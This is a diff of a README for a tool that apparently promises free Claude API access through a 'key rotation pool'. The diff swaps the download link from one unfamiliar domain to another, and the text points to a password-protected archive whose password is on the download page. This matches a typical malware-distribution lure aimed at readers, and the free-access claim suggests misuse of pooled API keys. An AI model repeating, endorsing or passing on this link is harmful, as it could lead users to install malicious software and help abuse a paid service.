@@ -18,7 +18,7 @@ Access Claude API (Opus and Sonnet) for free via key rotation pool. OpenAI-compa
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/claudefree2)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/claudefree2)
 
 > The archive password is shown on the download page.
 
